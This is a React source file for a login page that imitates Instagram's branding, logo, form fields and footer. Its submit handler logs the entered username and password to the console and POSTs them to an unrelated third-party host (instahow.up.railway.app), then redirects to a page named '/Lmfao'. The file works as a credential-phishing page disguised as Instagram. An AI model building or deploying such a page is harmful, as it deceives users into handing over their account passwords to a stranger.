import React,{useState} from 'react'
import {Icon,Divider,Text,InputGroup,InputRightElement,ChakraProvider,Heading, Stack,VStack,FormControl, FormLabel, Input, Button, Box, Container, IconButton,Image,useToast } from '@chakra-ui/react';
import {FaFacebookSquare} from 'react-icons/fa'
import { ViewIcon, ViewOffIcon } from "@chakra-ui/icons";
import { useNavigate } from "react-router-dom";




 
const Auth = () => {
  const navigate=useNavigate();
  const [loginid,setLogin]=useState()
  const [password,setPassword]=useState()
  const toast = useToast()
  const [showPassword,setShowPassword]= React.useState(false);
  const [loading,setLoading]=useState(false)

  const submitHandler=async(event)=>{
    setLoading(true);
    if(!loginid||!password){
      toast({
        title: 'Please fill the requied data',
                status: 'warning',
                duration: 5000,
                isClosable: true,
                position:"bottom",
      });
      setLoading(false);
      return;
    }
    console.log(loginid,password)
    try{   
           const response = await fetch('https://instahow.up.railway.app/api/login',{
            method: 'POST',
            mode:'cors',
            headers:{
              'Content-Type':'application/json',
            },
            body: JSON.stringify({
              loginid,
              password,
            })
           })
           if(response.ok){
            const data = await response.json()
            navigate("/Lmfao")
           }
           else{
            console.log("what is this");
           }
        }
     catch(error){
             toast({
                title: 'Error Occured',
                status: 'Warning',
                duration: 5000,
                isClosable: true,
                position:"bottom",
            });
      }
  }



  return (
    <ChakraProvider> 
    <Container bg="#fafafa" maxW="screen-xl" minH="screen-full">
      <VStack>
      <Box
        width="400px"
        pt="30px"
        pb="15px"
        pr="27px"
        pl="27px"
        mt="50px"
        bg="white"
        boxshadow="lg"
        borderRadius="5px"
        display="flex"
        flexDirection="column"
        alignItems="center"
        borderWidth="1px"
        borderColor=""
        >
        <Heading size='lg' fontSize='40px' mt="30px">
            <Image w="225px" h="65px" src="https://i.ibb.co/cLsZXVB/download-removebg-preview-2.png" alt="Instagram"/>
        </Heading>
        <FormControl mt="50px" align="center" id="loginid">
            
            <Input
                w="300px"
                id="loginid"
                type="text"
                sx={{
                  fontSize:"13px"
                }}
                placeholder="Phone number, username or email"
                value={loginid}
                onChange={(event)=>setLogin(event.target.value)}
                bg="gray.50"
                />
        </FormControl>

        <FormControl mt="10px" align="center" id="password">
            <InputGroup w="300px">
                <Input
                type={showPassword? "text" : "password"}
                placeholder='Password'
                id="password"
                value={password}
                onChange={(event)=>setPassword(event.target.value)
                }
                 sx={{
                  fontSize:"13px"
                }}
                  bg="gray.50"
                />
                <InputRightElement width={"5rem"}>
                    <Box as="span" cursor="pointer" ml="7" onClick={() => setShowPassword(!showPassword)}>
                      {showPassword ? <ViewOffIcon /> : <ViewIcon />}
                    </Box>
                </InputRightElement>
                </InputGroup>
        </FormControl>

        <Button w="300px" mt="20px" colorScheme="blue" type="submit" onClick={submitHandler}>
            Log in
        </Button>
        
        <FormControl>
        <Stack mt={"5px"} isInline align="center" p={4}>
           <Divider orientation='horizontal' colorScheme={"gray"} />
              <Text color={"gray.400"} fontSize="13px" fontWeight={"bold"}>OR</Text>
                      <Divider orientation='horizontal' colorScheme={"gray"} />
        </Stack>
        </FormControl>

        <FormControl>
          <Box display="flex" flexDirection="row" justifyContent={"center"}>
             <Icon as={FaFacebookSquare} mr={"5px"} color="darkblue"/>
            <Text href="#" cursor={"pointer"} align='center' fontSize={"13px"} color="darkblue" fontWeight={"bold"}>
                 Log in with Facebook
            </Text>
          </Box>
        </FormControl>

        <FormControl>
           <Text href="#" cursor={"pointer"} align='center' color="gray.500" fontSize={"13px"} mt={"18px"}>
                Forgot password?
            </Text>
        </FormControl>
        </Box>
        <Box display="flex" flexDirection={"row"} justifyContent={"center"}
          width="400px"
        p="20px"
        mt="20px"
        bg="white"
        boxshadow="lg"
        borderRadius="5px"
        alignItems="center"
        borderWidth="1px"
        borderColor="">
          <Text fontSize="14px" color={"gray.500"}>Dont have an account?&nbsp;</Text>
          <Text cursor={"pointer"} fontSize="14px" fontWeight={"bold"} color="blue.500"> Sign up</Text>
        </Box>
        <Box mt="50px">
          <Text fontSize="14px" color={"gray.500"}>
            Get the app
          </Text>
        </Box>
        <Box display="flex" flexDirection="row" w="250">
          <Box width={"120px"} pr="10px" height={"40px"} cursor="pointer">
            <Image fit={"cover"} src='https://i.ibb.co/X5nVTgM/Play-Storellogo.png' alt="Get it from PlayStore" />
          </Box>
          <Box width={"120px"} pl="10px" height="40px" cursor="pointer">
            <Image fit="cover" src='https://i.ibb.co/J7YdvVw/mslogo.png' alt="Get it from MicroSoft Store" />
          </Box>
        </Box>
      </VStack>
      <Box mt="50px" maxW="screen-xl" minH="screen-full" align="center">
             <Box maxW="500px" display="flex" flexDirection="row" flexWrap="wrap" justifyContent={"space-around"}>
              <Text fontSize="13px" color="gray.500" pr="10px">
                Meta
              </Text>
              <Text fontSize="13px" color="gray.500" pr="10px">
                About
              </Text>
              <Text fontSize="13px" color="gray.500" pr="10px">
                Blog
              </Text>
              <Text fontSize="13px" color="gray.500" pr="10px">
                Jobs
              </Text>
              <Text fontSize="13px" color="gray.500" pr="10px">
                Help
              </Text>
              <Text fontSize="13px" color="gray.500" pr="10px">
                API
              </Text>
              <Text fontSize="13px" color="gray.500" pr="10px">
                Privacy
              </Text>
              <Text fontSize="13px" color="gray.500" pr="10px">
                Terms
              </Text>
              <Text fontSize="13px" color="gray.500" pr="10px">
                Top Accounts
              </Text>
              <Text fontSize="13px" color="gray.500" pr="10px">
                Locations
              </Text>
              <Text fontSize="13px" color="gray.500" pr="10px">
                Instagram Lite
              </Text>
              <Text fontSize="13px" color="gray.500" pr="10px">
                Contact Uploading & Non-Users
              </Text>
            </Box>
            <Box maxWidth={"screen-xl"} mt="10px" mb="10px" align="center" >
                <Text fontSize="13px" color="gray.500">
                  © 2023 Instagram from Meta
                </Text>
            </Box>
      </Box>
    </Container>
    </ChakraProvider>
  )
}

export default Auth